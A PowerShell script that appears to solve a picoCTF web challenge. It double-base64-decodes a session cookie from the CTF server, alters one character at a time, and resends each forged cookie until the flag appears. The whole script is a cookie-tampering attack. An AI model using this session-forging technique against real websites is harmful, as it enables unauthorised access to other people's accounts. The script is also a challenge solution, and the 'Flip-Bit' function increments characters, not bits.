function From-Base64 {
    param(
        [string] $value
    )
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
}

function To-Base64 {
    param(
        [string] $value
    )
    return [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($value))
}

function Flip-Bit {
    param(
        $bit
    )
    $ascii = [int][char]$bit
    $ascii++
    return [char]$ascii
}
$endpoint = 'http://mercury.picoctf.net:43275/'
$Response = Invoke-WebRequest -Uri $endpoint -SessionVariable session
$cookies = $session.Cookies.GetCookies($endpoint)
$cookie = $cookies[0]

write-host "original: $($cookie.Value)"

$decoded1 = From-Base64 $cookie.Value
$decoded2 = From-Base64 $decoded1
$decoded = [char[]]$decoded2
write-host "decoded 1: $decoded1"
write-host "decoded 2: $decoded2"

# Started at 1 to -1 because I know the string contains {}
for ($i = 1; $i -lt $decoded.length - 1; $i++) {
    $altered = @() + $decoded
    $altered[$i] = Flip-Bit $decoded[$i]
    $altered = ([string]($altered -join ''))
    write-host "altered: $altered"
    $encoded1 = To-Base64 $altered
    $encoded2 = To-Base64 $encoded1
    write-host "encoded1: $encoded1"
    write-host "encoded2: $encoded2"
    $new = [System.Net.Cookie]::new($cookie.Name, $encoded2)
    $session.Cookies.Add($endpoint, $new)
    $Response = Invoke-WebRequest -Uri $endpoint -WebSession $session
    if ($Response.Content -Match '.*picoCTF{.*.}.*') {
        write-output "Match found for $encoded2" -Foreground green
        exit
    }
    else {
        $Response.Content | Out-File -Append -FilePath 'results.txt'
    }
}



exit

